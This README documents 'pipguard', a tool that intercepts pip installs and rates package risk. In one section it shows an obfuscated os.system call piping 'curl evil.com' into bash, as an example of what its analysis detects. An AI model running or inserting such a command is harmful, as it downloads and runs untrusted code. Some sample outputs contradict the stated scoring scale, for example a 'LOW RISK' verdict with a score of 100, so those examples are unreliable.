# pipguard

Supply chain attack prevention for pip installs. Analyzes Python packages for security risks **before** they touch your system.

```bash
pip install pipguard-cli
pipguard configure
```

From that point on, `pip install simple-package-name` automatically runs through pipguard. More complex installs (requirements files, local paths) pass through to pip unchanged. GitHub repos are now fully analyzed too.

---

## The Problem

Supply chain attacks on Python packages are increasing — fake packages stealing API keys, compromised maintainer accounts pushing backdoors, typosquatted names targeting developers who mistype. The data to detect these threats exists across PyPI, OSV.dev, and GitHub. The problem is nobody checks before installing.

pipguard makes checking automatic.

---

## How It Works

Every `pip install` triggers a two-layer analysis before anything downloads. Works for both PyPI packages and direct GitHub repository installs.

**Layer 1 — Trust signals** (no download required)

*For PyPI packages:*
- Package age and version history
- Download spike detection
- Known CVEs via OSV.dev
- GitHub repo presence

*For GitHub repositories:*
- Repository age and creation date
- Star count and fork ratio
- Contributor count and activity
- License presence
- Time since last commit
- Known CVEs via OSV.dev

**Layer 2 — Static code analysis** (AST-based)
- Downloads the source tarball
- Analyzes `setup.py` and `__init__.py` via AST and scans `pyproject.toml` values without executing anything
- Detects network calls, env variable access, shell execution, base64 obfuscation, home directory access

Results are combined into a risk score:

```
0–30   → LOW RISK     — installs automatically
31–60  → MEDIUM RISK  — asks for confirmation
61+    → HIGH RISK    — blocked, requires explicit override
```

---

## Key Features

✅ **Zero friction** — After one setup command, security checks happen automatically  
✅ **Non-blocking for trusted packages** — Low-risk packages install instantly  
✅ **AST-powered code analysis** — Catches obfuscated malicious patterns grep misses  
✅ **Full GitHub support** — Analyze direct GitHub installs with repo-specific signals (age, stars, contributors, license)  
✅ **Works with everything** — PyPI packages, GitHub repos, local paths—only analyzes what it can  
✅ **CI-ready** — `--ci` mode exits with code 1 on threshold for pipeline integration  
✅ **Instant repeat checks** — 24-hour cache means same package installs are instant  
✅ **No execution** — Purely static analysis; code is never run

---

## Example Output

### PyPI Package Analysis
```
$ pip install some-package

Analyzing some-package...

--------------------------------- TRUST SCORE ---------------------------------
  Package age:                    12d  [ALERT]                           
  GitHub repo:                    [ALERT] none                           
  Download spike:                 normal  [OK]                           
  Known vulns:                    [OK] none                              

-------------------------------- CODE ANALYSIS --------------------------------
  Network requests:               [ALERT] FOUND                          
  Env var access:                 [ALERT] FOUND                          
  Shell execution:                [OK] NOT FOUND                         
  Base64 obfuscation:             [OK] NOT FOUND                         
  Home dir access:                [OK] NOT FOUND                         

-------------------------------------------------------------------------------
-
  VERDICT:  HIGH RISK  (Score: 75)  - small package, low-trust
  Contributing factors:
    * Package age only 12d
    * No linked GitHub repo
    * Network requests in setup code
    * Env variable access in setup code

-------------------------------------------------------------------------------
-

Proceed anyway? [y/N]
```

### GitHub Repository Analysis
```
$ pip install git+https://github.com/psf/requests

Analyzing git+https://github.com/psf/requests...

--------------------------------- TRUST SCORE ---------------------------------
  Repo age:                       5550d  [OK]                            
  Stars:                          53925  [OK]                            
  Contributors:                   120  [OK]                              
  Known vulns:                    [ALERT] 2 found (GHSA-xxxxx-xxxxx)     

-------------------------------- CODE ANALYSIS --------------------------------
  Network requests:               [OK] NOT FOUND                         
  Env var access:                 [OK] NOT FOUND                         
  Shell execution:                [OK] NOT FOUND                         
  Base64 obfuscation:             [OK] NOT FOUND                         
  Home dir access:                [OK] NOT FOUND                         

-------------------------------------------------------------------------------
-
  VERDICT:  LOW RISK  (Score: 100)  - github package, unverified
  Contributing factors:
    * 2 known CVE(s) - GHSA-xxxxx-xxxxx

-------------------------------------------------------------------------------
-
```

---

## Installation & Setup

```bash
pip install pipguard-cli
pipguard configure
```

`configure` writes a shell function to your profile that intercepts `pip install`. Works on bash, zsh, fish, and PowerShell. Close and reopen your terminal after running it.

### What Gets Analyzed

✅ **Single package names** → analyzed through pipguard  
✅ **GitHub repository URLs** → analyzed with GitHub-specific signals  
❌ **Complex commands** → passed to pip unchanged  
- `pip install requests` → pipguard analyzes via PyPI
- `pip install git+https://github.com/user/repo.git` → pipguard analyzes via GitHub API
- `pip install git+https://github.com/user/repo@branch` → analyzes specified branch
- `pip install -r requirements.txt` → direct to pip
- `pip install ./local/path` → direct to pip
- `pip install package1 package2` → direct to pip

### GitHub Repository Installs

**GitHub repos are now fully analyzed!** pipguard queries the GitHub API for:
- Repository age and activity (last commit, contributor count)
- Popularity signals (stars, forks)
- License presence
- Known CVEs

Just use: `pip install git+https://github.com/owner/repo`

### Other Non-PyPI Sources

For things not on PyPI and not GitHub (local paths, wheels, etc.):
- pipguard skips analysis and shows: `"Package not found on PyPI—skipping security analysis."`
- pip proceeds as normal
- **No need for workarounds like `python -m pip`** — pipguard gets out of the way automatically

### Updating pipguard Itself

```bash
python -m pip install pipguard-cli --upgrade
```

(Uses `python -m pip` to bypass the shell alias.)

---

## Commands

```bash
pipguard install <package>             # analyze then install (PyPI or GitHub)
pipguard info <package>                # report only, no install
pipguard scan                          # scan requirements.txt
pipguard scan --ci --fail-on medium    # CI mode, exits 1 on threshold
pipguard history                       # recent scan results (mixed PyPI & GitHub)
pipguard update --force                # clear cached analysis results immediately
pipguard configure                     # set up shell interception
```

### Examples

```bash
# PyPI packages
pipguard install requests
pipguard info flask

# GitHub repositories
pipguard install git+https://github.com/psf/requests
pipguard info git+https://github.com/django/django
pipguard install git+https://github.com/pallets/flask@2.0.x

# Scan requirements file
pipguard scan requirements.txt
pipguard scan --ci --fail-on high
```

---

## CI/CD

```yaml
# GitHub Actions example
- name: Scan dependencies
  run: pipguard scan --ci --fail-on high
```

Exits with code `1` if any package meets the fail threshold, blocking the pipeline.

---

## GitHub Repository Support

pipguard now analyzes Python packages installed directly from GitHub repositories. This extends protection to the growing ecosystem of developers who install directly from source repositories.

### GitHub-Specific Signals

When analyzing a GitHub repository, pipguard checks:
- **Repository age** — Repos created <30 days ago score +30 risk points
- **Popularity** — Repos with zero stars (>30 days old) score +15 points
- **Contributor count** — Solo-contributor mature repos score +10 points
- **Activity** — No commits for >2 years scores +15 points
- **License** — Missing license scores +15 points
- **Code analysis** — Full AST analysis on `setup.py`, `pyproject.toml`, `__init__.py` (same as PyPI)
- **CVEs** — Known vulnerabilities from OSV.dev

### Why GitHub Repositories Need Analysis

GitHub is where malicious actors increasingly hide:
- **No review process** — Anyone can publish; no vetting like PyPI has
- **Unstructured versions** — No release tags or version history
- **Account takeover risk** — Compromised GitHub accounts can push backdoors instantly
- **Typosquatting risk** — Similar GitHub URLs are easy to forge
- **No package registry** — No central database to detect anomalies

pipguard brings the same supply-chain analysis to GitHub that it provides for PyPI.

---

## Real-World Scenarios

### Scenario 1: Typosquatting Attack
You meant to install `requests` but typo'd it as `requets`:
```bash
pip install requets
# pipguard: "Package 'requets' not found on PyPI"
# (Protected — install blocked before fake package downloads)
```

### Scenario 2: Compromised Popular Package
A popular package's maintainer account gets hacked:
```bash
pip install django==3.0  # Very old version suddenly in downloads
# pipguard: HIGH RISK (Score: 72)
#   - Package age: 4 years old
#   - Download spike: +450% above normal
#   - CVE records present
# Proceed anyway? [y/N] _
```

### Scenario 3: New Legitimate Package
A brand new package launches that you trust:
```bash
pip install my-startup-package
# pipguard: MEDIUM RISK (Score: 45)
#   - Package age: 2 days old
#   - No GitHub repo found
#   - Code analysis: clean
# Proceed anyway? [y/N] _
```

### Scenario 4: Dependency Chain
Your requirements.txt includes 20 packages:
```bash
pip install -r requirements.txt
# pipguard: Passes through to pip
# (Complex multi-package installs don't block—only simple single-package installs are gated)
```

### Scenario 5: Fresh GitHub Repository
A friend shares a promising new Python project on GitHub:
```bash
pip install git+https://github.com/username/amazing-tool
# pipguard: MEDIUM RISK (Score: 35)
#   - Repo age: 3 days old
#   - Stars: 0
#   - Contributors: 1
#   - Code analysis: clean
# Proceed anyway? [y/N] _
```

### Scenario 6: Established GitHub Project
Installing a well-maintained open source project:
```bash
pip install git+https://github.com/python/cpython
# pipguard: LOW RISK (Score: 0)
#   - Repo age: 30+ years
#   - Stars: 60K+
#   - Contributors: 200+
#   - Last push: 2 hours ago
#   - License: PSF
# Installing git+https://github.com/python/cpython...
```

---

## Why AST over grep

pipguard uses Python's AST parser instead of string matching. This catches obfuscated patterns that grep misses:

```python
# grep misses this, AST catches it
getattr(os, 'sys'+'tem')('curl evil.com | bash')
```

---

## Caching

Results are cached locally at `~/.pipguard/cache.db` for 24 hours. Repeat installs of the same package are instant. Use `--no-cache` to force a fresh check, or `pipguard update --force` to immediately clear cached analyses after a major security event.

---

## Comparison with Other Tools

| Tool | When it checks | What it checks | Blocks install? | Workflow |
|------|---|---|---|---|
| **pip audit** | After install | Known CVEs only | No | Manual command |
| **socket.dev** | Manual checks | Package risk score | No | Web portal, separate step |
| **Dependabot** | Scheduled scans | Version updates + CVEs | No | Reacts after merged |
| **OWASP Dependency-Check** | Build time | Known vulnerabilities | Maybe | CI-only, heavyweight |
| **pipguard** | **At install time** | **Trust signals + AST analysis** | **Yes** | **Automatic, zero-friction** |

**pipguard wins on prevention, not reaction.** You don't install first and scan later—you prevent the install if something looks wrong.

---

## Quick Comparison Table

| Feature | pipguard | pip audit | Dependabot | socket.dev |
|---------|----------|-----------|-----------|-----------|
| Intercepts at install | ✅ | ❌ | ❌ | ❌ |
| Analyzes PyPI packages | ✅ | ✅ | ✅ | ✅ |
| Analyzes GitHub repos | ✅ | ❌ | ❌ | ❌ |
| Detects new malicious packages | ✅ | ❌ | ❌ | ✅ |
| CLI integration | ✅ | ✅ | ❌ | ❌ |
| AST code analysis | ✅ | ❌ | ❌ | ❌ |
| Works offline (cached) | ✅ | ✅ | ❌ | ❌ |
| CI/CD ready | ✅ | ✅ | ✅ | Limited |
